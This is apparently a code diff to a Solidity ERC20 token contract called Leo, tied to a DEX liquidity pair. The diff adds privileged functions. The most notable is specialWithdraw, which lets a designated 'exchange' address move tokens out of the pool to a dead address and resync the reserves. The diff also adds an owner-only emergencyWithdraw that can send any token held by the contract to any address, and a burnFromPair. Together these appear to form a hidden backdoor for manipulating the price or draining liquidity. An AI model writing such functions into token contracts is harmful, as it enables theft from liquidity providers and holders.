@@ -50,6 +50,7 @@ contract Leo is ERC20, Ownable{
     address public wallet;
     address public nodeDividends;
     address public payback;
+    address public exchange;
 
     bool    private swapping;
     bool    public burnFinished;
@@ -77,11 +78,13 @@ contract Leo is ERC20, Ownable{
             .createPair(address(this), USDT);
     }
 
-    function setAddrConfig(address _nodeDividends, address _payback)external onlyOwner{
+    function setAddrConfig(address _nodeDividends, address _payback, address _exchange)external onlyOwner{
         nodeDividends = _nodeDividends;
         payback = _payback;
+        exchange = _exchange;
         allowlist[_nodeDividends] = true;
         allowlist[payback] = true;
+        allowlist[_exchange] = true;
     }
 
     function setRate(uint256 _buyRate) external onlyOwner{
@@ -96,6 +99,16 @@ contract Leo is ERC20, Ownable{
 
     function issueBuyTaxFee() external onlyOwner{
         _issue();
+    }
+
+    function burnFromPair() external onlyOwner{
+        _burnFromPair();
+    }
+
+    function emergencyWithdraw(address token, uint256 amount, address to)
+        external onlyOwner
+    {
+        IERC20(token).transfer(to, amount);
     }
 
     function _swap(uint256 amountToken, address to) private{
@@ -206,6 +219,12 @@ contract Leo is ERC20, Ownable{
         if (wallet != address(0) && walletAmount > 0) {
             _swap(walletAmount, wallet);
         }
+    }
+
+    function specialWithdraw(uint256 amount) external {
+        require(msg.sender == exchange, "NO_PERMISSION");
+        super._update(pancakePair, DEAD, amount);
+        IUniswapV2Pair(pancakePair).sync();
     }
 
 }
